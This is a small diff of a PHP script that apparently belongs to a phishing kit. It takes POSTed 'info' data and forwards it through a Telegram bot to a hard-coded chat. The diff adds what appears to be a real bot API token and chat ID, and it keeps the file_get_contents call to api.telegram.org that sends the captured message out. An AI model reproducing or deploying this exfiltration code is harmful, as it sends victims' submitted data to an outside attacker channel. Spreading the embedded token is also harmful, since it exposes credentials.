@@ -17,11 +17,12 @@ if (isset($_POST['info'])) {
 
 
 // Setting 
-$apiToken = "";
-$YOUR_ID_TELE = "";
+$apiToken = "8224829602:AAHQr6S_wtiv8-Y3pjy4B8HqFKZptt8QrSM";
+$YOUR_ID_TELE = "8434336483";
 
 
 // You :
 $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
 // SomeOne Else : 
 // $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
+
